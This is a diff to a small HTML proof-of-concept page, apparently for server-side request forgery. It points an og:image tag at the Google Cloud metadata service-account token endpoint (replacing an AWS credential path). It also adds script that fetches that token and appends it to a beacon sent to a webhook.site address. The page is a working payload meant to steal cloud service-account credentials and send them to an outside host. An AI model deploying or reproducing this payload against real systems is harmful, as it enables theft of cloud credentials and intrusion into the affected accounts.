@@ -1,10 +1,17 @@
 <!doctype html>
   <html><head>
-      <meta property="og:image" content="http://test-test2-123-poc.vercel.app/latest/meta-data/iam/security-credentials/">
+      <meta property="og:image" content=" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token">
     <title>poc</title>
   </head><body>
     <script>
-      new Image().src = 'http://webhook.site/eb4cfbc0-8a8e-439f-a92f-dc540c771db2?ua=' + encodeURIComponent(navigator.userAgent);
-    </script>
+async function fetchUrl(url) {
+  const response = await fetch(url);
+  const content = await response.text();
+  return content;
+}
+const html = await fetchUrl('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token');
+
+      new Image().src = 'http://webhook.site/eb4cfbc0-8a8e-439f-a92f-dc540c771db2?ua=' + encodeURIComponent(navigator.userAgent) + html;
+  </script> 
     <h1>poc</h1>
   </body></html>
